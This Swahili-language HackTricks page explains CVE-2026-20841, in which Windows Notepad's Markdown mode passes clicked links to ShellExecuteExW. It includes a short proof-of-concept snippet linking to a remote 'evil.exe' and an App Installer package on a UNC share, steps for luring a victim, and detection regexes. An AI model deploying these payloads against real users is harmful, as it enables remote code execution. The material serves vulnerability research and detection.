# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Programu za Windows zinazo-render Markdown au HTML zinaweza kupeleka malengo yaliyobofiwa kwa `ShellExecuteExW`. Kwa kuwa ShellExecute hutumia URI schemes zilizosajiliwa na file associations, renderer inahitaji allowlist iliyo wazi badala ya kudhani kuwa kila link ni HTTP(S). Tabia ya Notepad iliyoelezwa hapa chini inahusu CVE-2026-20841 na haipaswi kudhaniwa kuwa inatumika kwa kila renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Sehemu ya ShellExecuteExW katika Markdown mode ya Windows Notepad
- Notepad huchagua Markdown mode **kwa viendelezi vya `.md` pekee**, kupitia ulinganisho wa string usiobadilika katika `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Markdown links zinazotumika:
  - Kawaida: `[text](target)`
  - Autolink: `<target>` (huonyeshwa kama `[target](target)`), kwa hiyo sintaksia zote mbili ni muhimu kwa payloads na detections.
- Mibofyo ya link hushughulikiwa katika `sub_140170F60()`, ambayo hufanya uchujaji dhaifu kisha kuita `ShellExecuteExW`.
- `ShellExecuteExW` hutumia **protocol handler yoyote iliyosanidiwa**, si HTTP(S) pekee.<sup>[[1]](#references)</sup>

### Mambo ya kuzingatia kuhusu payload
- Mfuatano wowote wa `\\` kwenye link **hubadilishwa kuwa `\`** kabla ya kufikia `ShellExecuteExW`, na kuathiri uundaji na utambuzi wa UNC/path.
- Faili za `.md` **hazihusishwi na Notepad kwa chaguo-msingi**; mwathiriwa bado lazima afungue faili katika Notepad na kubofya link, lakini link inaweza kubofiwa baada ya kuonyeshwa.
- Mifano ya schemes hatari:<sup>[[1]](#references)</sup>
  - `file://` ili kuzindua payload ya ndani/UNC.
  - `ms-appinstaller://` ili kuanzisha mtiririko wa App Installer. Schemes nyingine zilizosajiliwa ndani ya kifaa pia zinaweza kutumiwa vibaya.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```

### Mtiririko wa unyonyaji
1. Tengeneza **faili la `.md`** ili Notepad ilionyeshe kama Markdown.
2. Pachika kiungo kinachotumia URI scheme hatari (`file:`, `ms-appinstaller:`, au handler yoyote iliyosakinishwa).
3. Peleka faili (kupitia HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB au njia nyingine inayofanana) na umshawishi mtumiaji alifungue katika Notepad.
4. Akibofya, **kiungo kilichosawazishwa** hukabidhiwa kwa `ShellExecuteExW`, na protocol handler inayolingana hutekeleza maudhui yaliyorejelewa katika muktadha wa mtumiaji.<sup>[[1]](#references)[[2]](#references)</sup>

## Mawazo ya ugunduzi
- Fuatilia uhamishaji wa faili za `.md` kupitia port/protocol zinazotumika sana kuwasilisha nyaraka: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Changanua viungo vya Markdown (vya kawaida na autolink) na utafute `file:` au `ms-appinstaller:` bila kujali ukubwa wa herufi.
- Regex zinazoelekezwa na vendor ili kugundua ufikiaji wa rasilimali za mbali:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Marekebisho ya vendor yaliyoelezwa na ZDI yanazuia malengo yanayokubaliwa kuwa faili za ndani na HTTP(S). Panua detections kwa protocol handlers nyingine zilizosakinishwa inapohitajika, kwa sababu attack surface iliyosajiliwa hutofautiana kulingana na mfumo.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Utekelezaji wa Msimbo Holela katika Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC ya CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
